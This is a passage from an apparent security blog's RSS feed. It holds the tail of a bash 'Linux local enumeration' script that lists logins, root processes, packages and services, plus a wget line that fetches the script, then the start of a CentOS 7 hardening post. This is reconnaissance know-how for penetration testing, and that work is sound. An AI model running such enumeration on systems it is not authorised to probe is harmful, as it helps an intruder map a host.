&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;## &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$RED&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; Last Logged on Users&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;##&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'%*s\n'&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;COLUMNS&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;:-&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;tput cols&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'#'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$NORMAL&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;

/usr/bin/last

&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'%*s\n'&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;COLUMNS&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;:-&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;tput cols&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'#'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;##&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$RED&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;## &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$RED&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; Processes Running as root&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;##&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'%*s\n'&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;COLUMNS&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;:-&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;tput cols&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'#'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$NORMAL&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
/bin/ps &lt;span class=&quot;nt&quot;&gt;-ef&lt;/span&gt; | /bin/grep root


&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'%*s\n'&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;COLUMNS&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;:-&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;tput cols&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'#'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;##&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$RED&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;## &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$RED&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; Installed Packages for RHEL / Debian Based Systems&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;##&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'%*s\n'&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;COLUMNS&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;:-&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;tput cols&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'#'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$NORMAL&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# Enumarate CentOS / Ubuntu Boxes &lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# This is not a great way of ID'ing a box, but I'm being lazy&lt;/span&gt;


&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
/usr/bin/dpkg &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
/usr/bin/rpm &lt;span class=&quot;nt&quot;&gt;-qa&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'%*s\n'&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;COLUMNS&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;:-&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;tput cols&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'#'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;##&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$RED&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;## &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$RED&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; CentOS / RHEL Services that start at Boot&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;##&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'%*s\n'&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;COLUMNS&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;:-&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;tput cols&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'#'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$NORMAL&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;

chkconfig &lt;span class=&quot;nt&quot;&gt;--list&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;runlevel | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{ print $2}'&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;:on

&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'%*s\n'&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;COLUMNS&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;:-&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;tput cols&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'#'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;##&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$RED&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;## &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$RED&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; List of init Scripts aka System Services&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;##&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'%*s\n'&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;COLUMNS&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;:-&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;tput cols&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'#'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$NORMAL&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;


&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; /etc/init.d/

&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'%*s\n'&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;COLUMNS&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;:-&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;tput cols&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'#'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$NORMAL&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; More Linux enumeration commands can be found at: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; https://highon.coffee/docs/linux-commands  &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$RED&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; So long, and thanks for all the fish... &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$NORMAL&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;wget-url&quot;&gt;Wget URL&lt;/h2&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;wget https://highon.coffee/downloads/linux-local-enum.sh&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Enjoy.&lt;/p&gt;
</description>
        </item>
        
      
    
      
        
        <item>
          <title>Security Harden CentOS 7</title>
          <link>https://highon.coffee/blog/security-harden-centos-7/</link>
          <pubDate>Wed, 25 Mar 2015 00:52:10 +0000</pubDate>
          <dc:creator>Arr0way</dc:creator>
          
          
          <category>security-hardening</category>
          
          <guid isPermaLink="true">https://highon.coffee/blog/security-harden-centos-7/</guid>
          <description>&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/z6hxOZG.png&quot; alt=&quot;OpenSCAP Guide - Securing CentOS 7&quot; /&gt;&lt;/p&gt;

&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#security-harden-centos-7&quot; id=&quot;markdown-toc-security-harden-centos-7&quot;&gt;Security Harden CentOS 7&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#based-on-a-minimal-install&quot; id=&quot;markdown-toc-based-on-a-minimal-install&quot;&gt;Based on a Minimal Install&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#issues-with-security-hardening&quot; id=&quot;markdown-toc-issues-with-security-hardening&quot;&gt;Issues with Security Hardening&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#why-use-openscap-&quot; id=&quot;markdown-toc-why-use-openscap-&quot;&gt;Why use OpenSCAP ?&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#kickstart&quot; id=&quot;markdown-toc-kickstart&quot;&gt;Kickstart&lt;/a&gt;&lt;/li&gt;
